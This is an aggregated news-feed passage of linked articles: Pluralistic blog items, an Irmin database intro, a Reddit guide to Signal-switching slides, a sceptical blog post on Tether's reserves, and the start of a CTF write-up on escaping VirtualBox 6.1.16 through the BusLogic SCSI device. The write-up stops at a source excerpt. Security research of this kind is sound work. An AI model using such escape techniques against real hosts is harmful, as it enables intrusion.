<p>As Mike Masnick says: "it's just gaslighting people to pretend that Facebook has the power to moderate away all bad behavior, and even dumber to pretend that no such planning happened on your platform."</p>
<p><a href="https://www.techdirt.com/articles/20210113/17592046050/sheryl-sandberg-makes-disingenuous-push-to-argue-that-only-facebook-has-power-to-stop-bad-people-online.shtml">https://www.techdirt.com/articles/20210113/17592046050/sheryl-sandberg-makes-disingenuous-push-to-argue-that-only-facebook-has-power-to-stop-bad-people-online.shtml</a></p>
<p>Sandberg's position boils down to this: "if you're gonna get a fox to guard your henhouse, we should be that fox."</p>
<p>(<i>Image: <a href="https://commons.wikimedia.org/wiki/File:Henhouse_near_Ganthorpe_-_geograph.org.uk_-_670026.jpg">Phil Catterall</a>, <a href="https://creativecommons.org/licenses/by-sa/2.0/deed.en">CC BY-SA</a>, modified</i>)</p>
<hr>
<p><a name="g-man"></a><br>
<img src="https://i0.wp.com/craphound.com/images/shrine-greeted-by-head-g-man-j-edgar-hoover-head-of-the-department-of-justices-1024.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/shrine-greeted-by-head-g-man-j-edgar-hoover-head-of-the-department-of-justices-1024.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Yesterday was my 20th blogging anniversary. I admit that it carried more emotional freight than I expected. 20 years is a long time to do anything, let alone something that's so personal and yet so public.</p>
<p><a href="https://pluralistic.net/2021/01/13/two-decades/#hfbd">https://pluralistic.net/2021/01/13/two-decades/#hfbd</a></p>
<p>As it happens, an anonymous reader gave me a hell of a blogiversary gift: my first-ever FBI investigation! I've spoken to FBI agents before (Agent: Does your Tor exit node keep logs by any chance? Me: Nope. Agent: Dang), but I've never actually been <em>investigated</em>.</p>
<p>My phone rang with an unfamiliar local number. A calm voice on the other end introduced itself as an FBI special agent with the LA office. I pointed out that this was an unlikely claim and asked for a switchboard number I could call back on.</p>
<p>The agent said this was an entirely reasonable thing to do. A few minutes later, I was back on the phone with him.</p>
<p>Me: What can I do for you?</p>
<p>Him: I'm calling about a blog post you published. I'm sure you know which.</p>
<p>Me: Uh, no.</p>
<p>Him: The one about toppling statues.</p>
<p>He meant this post:</p>
<p><a href="https://pluralistic.net/2020/07/03/monument-toppling-season/#leverage">https://pluralistic.net/2020/07/03/monument-toppling-season/#leverage</a></p>
<p>tldr: it's a link to a Popular Mechanics article on the science of toppling monuments, with a brief intro and summary.</p>
<p>There's nothing illegal in that post, but also you should never talk to cops without a lawyer, so I asked him if he minded my setting up a time to make that happen. He said that was fine with him.</p>
<p>My EFF colleague Mark Rumold was kind enough to volunteer to call the special agent. He reported back shortly thereafter to say that the agent was responding to a complaint, and that he agreed my post was not unlawful in any way.</p>
<p>Mark confirmed for the agent that I was not planning any unlawful activity, and the agent asked him to remind me that people can misinterpret the things we publish on the internet.</p>
<p>That was it.</p>
<p>It was an anticlimax, sure. I confess that I was a little freaked out. It was just the anniversary of Aaron Swartz's death, and my mind kept going back to his account of the time the FBI showed up to ask him about PACER, and the horrors that followed.</p>
<p>But it's over. The agent, to his credit, was pleasant and reasonable. But I'm mystified by the complaint – my guess is some troll has figured out that you can sic the FBI on people you disagree with on the internet – and even more by the fact that the FBI acted on it.</p>
<p>They must have the discretion to decide when a complaint rises to the level of using a special agent's time and when it should go in the kook folder. Seems to me that filing complaints about my post in the kook folder should have been a no-brainer.</p>
<p>I'm looking into using FOIA and the 1974 Privacy Act to find out what kind of file this generated, and to have that record expunged.</p>
<p><a href="https://www.eff.org/deeplinks/2019/09/victory-individuals-can-force-government-purge-records-their-first-amendment">https://www.eff.org/deeplinks/2019/09/victory-individuals-can-force-government-purge-records-their-first-amendment</a></p>
<p>In the meantime, I'm declaring a federal criminal investigation to be the Official 20th Blogiversary gift.</p>
<hr>
<p><a name="yu-mex"></a><br>
<img src="https://i0.wp.com/craphound.com/images/yugoslav-mexican-parodies.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/yugoslav-mexican-parodies.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>The Cold War is memorialized as a moment in which the world split into two: the east and west, the Warsaw Pact and NATO. But a sizeable number of countries sat out the Cold War, and many of them formed a third bloc called the "nonaligned countries."</p>
<p>The nonaligned movement's founding member was Yugoslavia, and it became a socialist republic on the USSR's doorstep that had a simmering (and at times openly) hostile relationship with its vast neighbor.</p>
<p>This betwixt/between posture left Yugoslavia cut off from both Hollywood movies and Soviet cinema: naturally, they turned to the Mexican film industry.</p>
<p>The 1950s and 60s were the Yu-Mex moment, when the nation thrilled to imported Mexican movies that glorified the Mexican revolution. On Global Voices, Filip Stojanovski tells the story of a quarter century of Yugoslavian …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pluralistic.net/2021/01/15/hoover-calling/#phrenology">https://pluralistic.net/2021/01/15/hoover-calling/#phrenology</a></em></p>]]>
            </description>
            <link>https://pluralistic.net/2021/01/15/hoover-calling/#phrenology</link>
            <guid isPermaLink="false">hacker-news-small-sites-25796815</guid>
            <pubDate>Fri, 15 Jan 2021 21:32:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Irmin – A distributed database built on the same principles as Git]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25796563">thread link</a>) | @stunt
<br/>
January 15, 2021 | https://irmin.org/tutorial/introduction | <a href="https://web.archive.org/web/*/https://irmin.org/tutorial/introduction">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://github.com/mirage/irmin">Irmin</a> is a key-value store based on the same principles as Git. This means
that for existing Git users it provides many familiar features:
branching/merging, history and the ability to restore to any previous state.</p>
<p>Typically Irmin is accessed by embedding it into an OCaml application, but can
also be accessed using HTTP using <code>irmin-http</code> or GraphQL using <code>irmin-graphql</code>.
It is most often used to store application data, like configuration values,
shared state or checkpoint data, but there is nothing stopping you from using it
as a general purpose key-value store too. Additionally, since it is compatible
with Git, Irmin can be used to interact with Git repositories directly from
within your application.</p>
<p>Take a moment to skim the <a href="https://github.com/mirage/irmin/blob/master/README.md">README</a> to familiarize yourself with
some of the concepts. Also, if you find that anything is missing or unclear in
this tutorial then please file <a href="https://github.com/mirage/irmin.org/issues">an issue</a>!</p>
<!-- prettier-ignore-start -->
<!-- prettier-ignore-end --></div></div>]]>
            </description>
            <link>https://irmin.org/tutorial/introduction</link>
            <guid isPermaLink="false">hacker-news-small-sites-25796563</guid>
            <pubDate>Fri, 15 Jan 2021 21:12:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WhatsApp Status to convince your family and friends to switch to Signal]]>
            </title>
            <description>
<![CDATA[
Score 68 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25796535">thread link</a>) | @karlzt
<br/>
January 15, 2021 | https://teddit.net/r/signal/comments/kwovyz/whatsapp_status_to_convince_your_family_friends/ | <a href="https://web.archive.org/web/*/https://teddit.net/r/signal/comments/kwovyz/whatsapp_status_to_convince_your_family_friends/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><!-- SC_OFF --><div><p><strong>**UPDATE: Ready to use after WA announced T&amp;C delay! New languages: Slovak, Czech, Portuguese (PT), Finnish, Turkish, Hindi, Spanish, Portuguese (BR), Italian, French, Dutch - more coming soon*\</strong>*</p>

<blockquote>
<p>Hey there, I'm using Signal!</p>
</blockquote>

<p>When people switch to Signal they often have the problem to convince all their contacts from WhatsApp to do the same. I had that struggle too.</p>

<p>That's why I created something to put into my WhatsApp Status: around 20 slides explaining why to switch and why I am going to delete WhatsApp. I think it's better to be educational than pushy or insulting to get people to switch, so I tried it this way and successfully got my family and friends to switch to Signal.</p>

<p>Now I decided to share the slides with you and hope they help you too!</p>



<p>There are 2 versions for each language: One including a comment about GDPR (for EU citizens) and one that does not mention anything about GDPR (rest of world).</p>

<p>F<em>or UK users:</em> <a href="https://teddit.net/u/Winnie_the_Pooch">u/Winnie_the_Pooch</a> <em>commented: "[...] use the EU version. Even though weâ€™ve now left, the EU GDPR has (thankfully!) been enshrined in British law as the</em> <a href="https://ico.org.uk/for-organisations/dp-at-the-end-of-the-transition-period/data-protection-now-the-transition-period-has-ended/the-gdpr/"><em>UK GDPR</em></a> <em>[...]". Lucky you!</em></p>



<p>WhatsApp delays their privacy policy update to <strong>mid of may</strong>!</p>

<p><strong>But this does not change the facts mentioned in the slides about metadata etc.!</strong> So, why should you wait until may? On the other hand, you now have more time to convince your contacts to switch!</p>

<p><strong>UPDATE:</strong> I updated each version like the following:</p>

<ul>
<li>The first slide does not have a headline anymore. You can add your own text here using the editing options in WhatsApp (its the T on the top right) or your favorite graphic editing software. Write something along the line as "I will delete WhatsApp on [insert date here]" or similar.</li>
<li>I replaced the last two chat messages on slide 03 with the text from slide 04. Total amount of slides reduced to 19!</li>
</ul>

<p><strong>Before sharing your new WhatsApp Status check if the Signal service is currently up and running:</strong> <a href="https://status.signal.org/">status.signal.org</a> (if it is down you should wait, as your contacts may not be able to register!)</p>



<p>​</p>

<p><strong>Thanks to all translators!</strong></p>

<table><thead>
<tr>
<th></th>
<th><strong>GDPR (for EU citizens)</strong></th>
<th><strong>No GDPR (rest of world)</strong></th>
</tr>
</thead><tbody>
<tr>
<td><strong>English</strong></td>
<td><a href="http://imgbox.com/g/wWfXnKIv9T">images</a> - <a href="https://filehorst.de/d/dsIzayIF">zip file</a></td>
<td><a href="https://imgbox.com/g/bu1G1Nnz8s">images</a> - <a href="https://filehorst.de/d/dxvCmdfH">zip file</a></td>
</tr>
<tr>
<td><strong>German</strong></td>
<td><a href="https://imgbox.com/g/6cGzvJ7JbQ">images</a> - <a href="https://filehorst.de/d/dtaAcwlv">zip file</a></td>
<td><a href="https://imgbox.com/g/KbIM7RBmAb">images</a> - <a href="https://filehorst.de/d/dtwhadvs">zip file</a></td>
</tr>
<tr>
<td><strong>Dutch</strong></td>
<td><a href="http://imgbox.com/g/KZzkrjNlRF">images</a> - <a href="https://filehorst.de/d/dhiGelei">zip file</a></td>
<td><a href="http://imgbox.com/g/no5XE3rLKf">images</a> - <a href="https://filehorst.de/d/dlHoIBJt">zip file</a></td>
</tr>
<tr>
<td><strong>Spanish</strong></td>
<td><a href="http://imgbox.com/g/jDX4co55Vc">images</a> - <a href="https://filehorst.de/d/dcjeAeEt">zip file</a></td>
<td><a href="http://imgbox.com/g/Pc0EkJ9qWh">images</a> - <a href="https://filehorst.de/d/dniedoph">zip file</a></td>
</tr>
<tr>
<td><strong>Portuguese (PT)</strong></td>
<td><a href="http://imgbox.com/g/2MHxmi4VFS">images</a> - <a href="https://filehorst.de/d/dCprbnrk">zip file</a></td>
<td><a href="http://imgbox.com/g/DaPhzju7Ht">images</a> - <a href="https://filehorst.de/d/dbAHawjy">zip file</a></td>
</tr>
<tr>
<td><strong>Portuguese (BR)</strong></td>
<td><a href="http://imgbox.com/g/Qj5taiuaL4">images</a> - <a href="https://filehorst.de/d/dIikBxhn">zip file</a></td>
<td><a href="http://imgbox.com/g/9WBMHYKcwA">images</a> - <a href="https://filehorst.de/d/dfxHgAay">zip file</a></td>
</tr>
<tr>
<td><strong>French</strong></td>
<td><a href="http://imgbox.com/g/5Po0sskqve">images</a> - <a href="https://filehorst.de/d/dAmaJgmw">zip file</a></td>
<td><a href="https://imgbox.com/g/hOwDOt4ORM">images</a> - <a href="https://filehorst.de/d/dkiwkiJw">zip file</a></td>
</tr>
<tr>
<td><strong>Czech</strong></td>
<td><a href="http://imgbox.com/g/BPWPrHxNCA">images</a> - <a href="https://filehorst.de/d/dgEajusf">zip file</a></td>
<td><a href="http://imgbox.com/g/7ThzK6HMyH">images</a> - <a href="https://filehorst.de/d/dinpsFvk">zip file</a></td>
</tr>
<tr>
<td><strong>Italian</strong></td>
<td><a href="http://imgbox.com/g/gT3KmJN3z7">images</a> - <a href="https://filehorst.de/d/dBIfvBvp">zip file</a></td>
<td><a href="http://imgbox.com/g/FT9Z1ROxFO">images</a> - <a href="https://filehorst.de/d/dIdfJagg">zip file</a></td>
</tr>
<tr>
<td><strong>Hindi</strong></td>
<td>please send translation for GDPR part (slide 12)</td>
<td><a href="http://imgbox.com/g/kJg7fHBEjK">images</a> - <a href="https://filehorst.de/d/drszqqzj">zip file</a></td>
</tr>
<tr>
<td><strong>Turkish</strong></td>
<td><a href="http://imgbox.com/g/U3rN7N2pUO">images</a> - <a href="https://filehorst.de/d/dnmqvpEx">zip file</a></td>
<td><a href="http://imgbox.com/g/60YM7Y9K8Q">images</a> - <a href="https://filehorst.de/d/dcyjAfcb">zip file</a></td>
</tr>
<tr>
<td><strong>Polish</strong></td>
<td>coming soon</td>
<td>coming soon</td>
</tr>
<tr>
<td><strong>Arabic</strong></td>
<td>coming soon</td>
<td>coming soon</td>
</tr>
<tr>
<td><strong>Cantonese</strong></td>
<td>coming soon</td>
<td>coming soon</td>
</tr>
<tr>
<td><strong>Finnish</strong></td>
<td><a href="http://imgbox.com/g/7XuhMwwKNU">images</a> - <a href="https://filehorst.de/d/dwymzjaJ">zip file</a></td>
<td><a href="http://imgbox.com/g/yAM6M5vklE">images</a> - <a href="https://filehorst.de/d/dhzrICHj">zip file</a></td>
</tr>
<tr>
<td><strong>Slovak</strong></td>
<td><a href="http://imgbox.com/g/UhzDU5wtuB">images</a> - <a href="https://filehorst.de/d/ddrHhsqh">zip file</a></td>
<td><a href="http://imgbox.com/g/iMIU4IPQJd">images</a> - <a href="https://filehorst.de/d/dweGmCEB">zip file</a></td>
</tr>
</tbody></table>

<p><strong>How to contribute</strong></p>

<p><em>Coming soon</em> means you don't have to send me translations for this language anymore, I just need to add them. Please be patient.</p>

<p>If you like to have the status in your language too: <a href="https://pastebin.com/Fc9Xcadi">here is the raw text</a> (try to not change the formatting please). Please translate only into languages you are fluent in.</p>

<p>!Please also provide a screenshot of the "New privacy policy" message  in your language for the 2nd slide. Search the web if needed!</p>



<p>Please look into related subreddits to get familiar with the topic:</p>

<ul>
<li><a href="https://teddit.net/r/signal">r/signal</a></li>
<li><a href="https://teddit.net/r/whatsapp">r/whatsapp</a></li>
<li><a href="https://teddit.net/r/privacy">r/privacy</a></li>
<li><a href="https://teddit.net/r/privacytoolsIO">r/privacytoolsIO</a></li>
</ul>

<p><strong>How to add WhatsApp Status in the correct order</strong></p>

<ol>
<li>First, take a look in your WhatsApp Status privacy settings and make sure to select all the contacts you want to see your new status.</li>
<li>Open the gallery app.</li>
<li>Select all images, starting from the first slide (1-19).</li>
<li>Press share.</li>
<li>Select WhatsApp.</li>
<li>Select "My Status" &amp; make sure the slides are in the correct order.</li>
<li>Add your custom intro text on slide 01.</li>
<li>Send. Done.</li>
</ol>

<p><strong>Best practices</strong></p>

<p>Think about what time is best to post your status. Think about what your contacts are probably doing at the moment. They might not want to read 20 slides of text while they are at work.</p>

<p>At last position in your story I recommend the video from <a href="https://teddit.net/r/signal/comments/kv54u7/best_signal_video_for_your_whatsapp_status/">this post</a> (credits to <a href="https://teddit.net/u/carlosfx">u/carlosfx</a> !).</p>

<p>Signal published a <a href="https://twitter.com/signalapp/status/1349236175773462532">replacement for your profile pic</a> on their twitter account.</p>

<p><a href="https://teddit.net/u/Xath0n">u/Xath0n</a> suggested to put a text status with a direct link to <a href="https://signal.org/downloads">signal.org/downloads</a> at the end, so people don't need to search for it (Signal is in the top charts in the app stores currently, so it shouldn't be too hard to find anyway).</p>

<p>You can also thank everyone for watching your TED talk, lol.</p>

<p>If you think most of your contacts don't look into WhatsApp Status you can do the following:</p>

<ul>
<li>let them know that you want them to look into your WA Status, because it's important to you</li>
<li>send the slides to your contacts directly or in a group chat</li>
<li>send them the link to the images (note that the mobile view of imgbox is not the best)</li>
</ul>



<ul>
<li>I know that 19+ slides are a lot for a single WhatsApp Status and people might not read it <strong>but it is worth a try.</strong></li>
<li>It is intentionally written in simple terms to be understood by people who are not as tech savvy as you are.</li>
<li>Be prepared for questions, arguments, debates and to provide evidence of what your new status is saying (look up this subreddit for more info). Make sure you know the facts!</li>
<li>The style of the content may not appeal to everyone in your contact list.</li>
<li>Remember that some of your contacts don't look at WA Status at all.</li>
</ul>



<p><strong>Animated Status</strong> (old date)</p>

<p><a href="https://teddit.net/user/JordyEGNL/">u/JordyEGNL</a> submitted an animated version of the EN (for EU citizens) status: <a href="https://teddit.net/r/signal/comments/kx4msl/i_transformed_the_pictures_of_ucrazylizards_post/">check it out</a> !</p>

<p><a href="https://teddit.net/u/candiesdoodle">u/candiesdoodle</a> submitted an animated version of the EN (outside EU) status: <a href="https://filehorst.de/download_mobile.php?file=dxaFzAvF">check it out</a> !</p>

<p><strong>Blank first slide</strong></p>

<p>Some of you asked if I can post the first slide with no text. <a href="https://imgbox.com/g/0FtNwMdC8P">Here it is</a>. Have fun.</p>



<p>The images linked above are published under the <a href="https://creativecommons.org/publicdomain/zero/1.0/">CC0 1.0 Universal (CC0 1.0) Public Domain Dedication</a>. Do whatever you want. No attribution required. Happy sharing!</p>

<p>​</p>

<p>Edit: Removed a weak argument on slide 19 about Telegram. Danke <a href="https://teddit.net/u/A2DreppiD">u/A2DreppiD</a> !</p>

<p>Edit2: Thanks for my first award ever <a href="https://teddit.net/u/TravellingTARDIS">u/TravellingTARDIS</a> !</p>

<p>Edit3: TIL Reddit for iPad messes up my markdown. Sry for that.</p>

<p>Edit4: <strong>THANK YOU ALL FOR THE AWARDS!</strong> Really appreciate it! I'm overwhelmed by the positive feedback and happy to hear that it helped a lot of you. Also: RIP inbox. Sry if I can't reply to all of your comments!</p>

<p>Edit5: there was a line missing in my pastebin for slide 03, thx <a href="https://teddit.net/u/TovaX">u/TovaX</a></p>

<p>Edit6: Added a how-to because many of you asked how to add multiple images to your status!</p>

<p>Edit7: Linked to Signal status page. New animated EN (outside EU) version!</p>
</div><!-- SC_ON --></div></div>]]>
            </description>
            <link>https://teddit.net/r/signal/comments/kwovyz/whatsapp_status_to_convince_your_family_friends/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25796535</guid>
            <pubDate>Fri, 15 Jan 2021 21:10:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tether: Unchained Credit on the Blockchain]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25796336">thread link</a>) | @dgellow
<br/>
January 15, 2021 | http://www.tr0lly.com/tether/tether-unchained-credit-on-the-blockchain/ | <a href="https://web.archive.org/web/*/http://www.tr0lly.com/tether/tether-unchained-credit-on-the-blockchain/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-557">
	
	<div>
		
<p>Peter McCormack’s podcast with Paolo Ardoino and Stuart Hoegner from Tether/Bitfinex did shed some light on Tether’s operations. Stuart Hoegner, the general counsel, answered most of the questions. Given his position, the devil wasn’t in what he said, but how he said it.</p>



<p>Overall, it was a performance of deflecting questions, making legally true statements, and trying to sound legit AF while accusing “nocoiners” of creating “FUD”. Tether really needed to rebuild some goodwill with the coiner community.</p>



<h2>Customers aren’t users</h2>



<p>Paolo Ardoino, while explaining how Tether can issue USDTs on weekends, says: </p>



<blockquote><p>“most of our, uh, biggest customers are banked into the same bank (as Tether, i.e. Deltec)”. </p><cite>Paolo Ardoino</cite></blockquote>



<p>It’s revealing how he paused after “most of our”, as he was about to say “most of our customers” – which would have been very weird. How come those hundreds of thousands of people who use USDTs all over the world could ALL have an account at a small banking institution in the Cayman Islands?</p>



<p>In fact, it’s not weird at all – Tether is calling “customers” a very small number of actual users, the ones Tether is issuing USDTs. The rest aren’t customers, they’re users. The distinction is very important, for Tether also says that they perform complete AML and KYC on their customers. This means that they know who are the people (some exchanges and OTC desks) to whom they issue USDTs; but after that first step, feel free to do whatever you want, the blockchain is your oyster!</p>



<p>Stuart also points out at the end of the interview that they don’t have US customers. Which also makes his claim that they’re regulated by FinCEN much less grand – after all, it’s not that hard to comply with regulations when none apply.</p>



<h2>Reserves are YOLO</h2>



<h3>Reserves? We definitely have some</h3>



<p>At the time Stuart had to swear on the NYAG affidavit, he admitted that Tether’s reserves were 74% cash and equivalents, the rest being an IOU from Bitfinex. He says, “USDTs are 100% backed by reserves, so the loan to Bitfinex is still good backing”, and later on, “so maybe people object to the amount of the backing, but it’s not nothing”. Oh it’s not nothing, case closed!</p>



<p>One thing is clear – these reserves aren’t cash. It can be whatever Tether wants, valued at prices convenient to them:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-22.34.51.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-22.34.51.png 618w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-22.34.51-300x201.png 300w" sizes="(max-width: 618px) 100vw, 618px"><figcaption>source: tether.to/legal</figcaption></figure>



<p>The rule of thumb is, whenever Tether talks about dollars, they don’t actually talk about dollars, but about their reserves, which aren’t dollars. Stuart says, </p>



<blockquote><p>“[at the time of the affidavit,] other than $2.1B in reserves (and today, just for context, that amount has grown to $22B), Tether had cash and cash equivalents on hand representing approximately 74% of the current outstanding USDTs). Just note that that loan is now $550m out of almost $22B in reserves – 2.5% of the total.” </p><cite>Stuart Hoegner</cite></blockquote>



<p>So we know the nature of 2.5% of their overall reserves – it’s the Bitfinex loan – but that doesn’t mean that the rest is cash. Why focus so much on such a small portion of their portfolio, then, if it isn’t to distract?</p>



<p>If you listened to the interview, you must have noticed how carefully Stuart is wording what he says, and the result is certainly very confusing for the average listener, who is entitled to believe they really have the $22 billion. I certainly heard exactly that, until I rewinded and listened to Stuart speak all over again.</p>



<h3>Backed by loans, like fiat</h3>



<p>Stuart also mentions “third party loans” as part of their reserves, like the loan to Bitfinex. Which is exactly how the fiat banking system works: banks will credit your account with new dollars if you sign an IOU. And it could very well explain how Tether ended up with a Bitfinex loan in the first place: Bitfinex needed 850m USDTs, didn’t have $850m, but simply signed an IOU for $850m. If you’ve seen the document, where Giancarlo Devasini, CFO of Tether and Bitfinex, signs both for Tether and Bitfinex, it’s epic.</p>



<p>Tether’s select few customers can access the USDT printer without any cash, and use the new USDTs for whatever they want. And you still wonder why Bitcoin has gone parabolic lately?</p>



<h2>Pumping Bitcoin</h2>



<h3>Tether owns Bitcoin, and they don’t want to say why</h3>



<p>Peter McCormack asks them, point blank, if they own Bitcoin, and if they use Tether to pump Bitcoin.</p>



<p>As per the affidavit, Stuart confirms that they own Bitcoin: </p>



<blockquote><p>“part of it is in Bitcoin; if nothing else, there are transaction fees, that need to be paid on the OMNI layer… we don’t presently comment on our asset makeup, overall, but we are contemplating starting a process of providing updates on that on the website this year”.</p><cite>Stuart Hoegner</cite></blockquote>



<p>Note how Stuart doesn’t say that the only Bitcoin they have is for the OMNI layer transactions. So they have other Bitcoin as well? And by the way, why are supposedly segregated customer assets being used to pay for operational costs?</p>



<p>Peter insists, “What’s the process of the Bitcoin reaching your basket?”, and this time Stuart deflects, “Paolo, do you have any comments on that?”</p>



<p>Left alone neck deep in shit by his lawyer, Paolo has no choice but to ask Peter to change the question: </p>



<blockquote><p>“Well, ummm… so… I’m not sure if the question is really clear. Are we talking about how we acquired the Bitcoin that we need to fulfil the OMNI layer transactions?”</p><cite>Paolo Ardoino</cite></blockquote>



<p>No Paolo, the question was why do you have Bitcoin in your reserves, not why you have a few Bitcoin for clear operational reasons. Why don’t you want to answer it?</p>



<h3>Tether buys Bitcoin, and they don’t want to say it</h3>



<p>When McCormack asks Stuart if they buy Bitcoin on the market, “at the right time”, and then pump it with Tethers, Stuart replies, </p>



<blockquote><p>“we don’t have the ability to buy Bitcoin at the right time in the market, we’re not prognosticators about wether the market’s gonna go up or down, that presumes some level of clairvoyance which we don’t have”. </p><cite>Stuart Hoegner</cite></blockquote>



<p>Well OK but the question wasn’t if you can see the future, but if you buy Bitcoin – why deflect it in such a weird way?</p>



<p>Peter insists “people say that you have the ability to pump the market by issuing Tethers”, to which Stuart replies, “We don’t issue Tethers to buy Bitcoin. We issue Tethers to customers who want Tethers.” So if a customer that happens to be Bitfinex wants to pump Bitcoin with USDT, that’s fine.</p>



<p>Then Paolo answers with its own rhetorical question.</p>



<blockquote><p>“The entire concept of us issuing Tethers to buy Bitcoins for ourselves doesn’t make sense. Why issue Tethers when we already have the dollars, and we have the ability to manage our inventory and out portfolio, when we could just use the dollars? The entire narrative is completely nonsense. Why do we have to do two steps when we can do one?”</p><cite>Paolo Ardoino</cite></blockquote>



<p>To answer Paolo’s rhetorical question with another rhetorical question, may I venture,</p>



<blockquote><p>“Why buy Bitcoins with real dollars, which are hard to get by, when you can simply print 20,000,000,000 USDTs that cost you nothing? Is it really because you’re too busy and want to save one <em>step</em>?”</p><cite>Trolly McTrollface</cite></blockquote>



<h2>No (unmet) redemptions</h2>



<p>Stuart boasts that all USDT redemption requests have always been met. Well, given Tether’s contract, that’s a pretty low bar:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-23.15.16.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-23.15.16.png 640w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-23.15.16-300x73.png 300w" sizes="(max-width: 640px) 100vw, 640px"><figcaption>Sure we will redeem, just not right now – but we’re not rejecting your request!</figcaption></figure>



<p>The <a href="http://tether.to/legal">whole USDT contract is just incredible</a>, when you read it. USDTs aren’t legal claims on Tether’s reserves. Maybe they are for Tether’s customers, who might have signed a different agreement with Tether. But if you’re not a Tether customer, USDTs are just digital toilet paper. You might be left with it forever on the blockchain, as a stark reminder that database entries without a contract in the real world, are utterly worthless.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

			
</article><!-- #post-${ID} -->

	<nav role="navigation">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>http://www.tr0lly.com/tether/tether-unchained-credit-on-the-blockchain/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25796336</guid>
            <pubDate>Fri, 15 Jan 2021 20:56:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Escaping VirtualBox 6.1: Part 1]]>
            </title>
            <description>
<![CDATA[
Score 281 | Comments 30 (<a href="https://news.ycombinator.com/item?id=25795731">thread link</a>) | @lima
<br/>
January 15, 2021 | https://secret.club/2021/01/14/vbox-escape.html | <a href="https://web.archive.org/web/*/https://secret.club/2021/01/14/vbox-escape.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>This post is about a VirtualBox escape for the latest currently available version (VirtualBox 6.1.16 on Windows). The vulnerabilities were discovered and exploited by our team <a href="https://twitter.com/Sauercl0ud">Sauercl0ud</a> as part of the <a href="https://realworldctf.com/">RealWorld CTF 2020/2021</a>.</p><p>The vulnerability was known to the organizers, requires the guest to be able to insert kernel modules and isn’t exploitable on default configurations of VirtualBox so the impact is very limited.</p><p>Many thanks to the organizers for hosting this great competition, especially to ChenNan for creating this challenge, <a href="https://twitter.com/M4x_1997">M4x</a> for always being helpful, answering our questions and sitting with us through the many demo attempts and of course all <a href="#credits">the people involved</a> in writing the exploit.</p><p>Let’s get to some pwning :D</p><h2 id="discovering-the-vulnerability"> <a href="#discovering-the-vulnerability">Discovering the Vulnerability</a></h2><p>The challenge description already hints at where a bug might be:</p><blockquote><p>Goal:</p><p>Please escape VirtualBox and spawn a calc(“C:\Windows\System32\calc.exe”) on the host operating system.</p><p>You have the full permissions of the guest operating system and can do anything in the guest, including loading drivers, etc.</p><p>But you can’t do anything in the host, including modifying the guest configuration file, etc.</p><p><strong>Hint: SCSI controller is enabled and marked as bootable.</strong></p><p>Environment:</p><p>In order to ensure a clean environment, we use virtual machine nesting to build the environment. The details are as follows:</p><ul><li>VirtualBox:6.1.16-140961-Win_x64.</li><li>Host: Windows10_20H2_x64 Virtual machine in Vmware_16.1.0_x64.</li><li>Guest: Windows7_sp1_x64 Virtual machine in VirtualBox_6.1.16_x64.</li></ul></blockquote><p>The only special thing about the VM is that the <code>SCSI</code> driver is loaded and marked bootable so that’s the place for us to start looking for vulnerabilities.</p><p>Here are the operations the <code>SCSI</code> device supports:</p><pre><code><span>// /src/VBox/Devices/Storage/DevBusLogic.cpp</span>
    
    <span>// [...]</span>

    <span>if</span> (fBootable)
    {
        <span>/* Register I/O port space for BIOS access. */</span>
        rc <span>=</span> PDMDevHlpIoPortCreateExAndMap(pDevIns, BUSLOGIC_BIOS_IO_PORT, <span>4</span> <span>/*cPorts*/</span>, <span>0</span> <span>/*fFlags*/</span>,
                                           buslogicR3BiosIoPortWrite,       <span>// Write a byte</span>
                                           buslogicR3BiosIoPortRead,        <span>// Read a byte</span>
                                           buslogicR3BiosIoPortWriteStr,    <span>// Write a string</span>
                                           buslogicR3BiosIoPortReadStr,     <span>// Read a string</span>
                                           <span>NULL</span> <span>/*pvUser*/</span>,
                                           <span>"BusLogic BIOS"</span> , <span>NULL</span> <span>/*paExtDesc*/</span>, <span>&amp;</span>pThis<span>-&gt;</span>hIoPortsBios);
        <span>// [...]</span>
    }
    <span>// [...]</span>
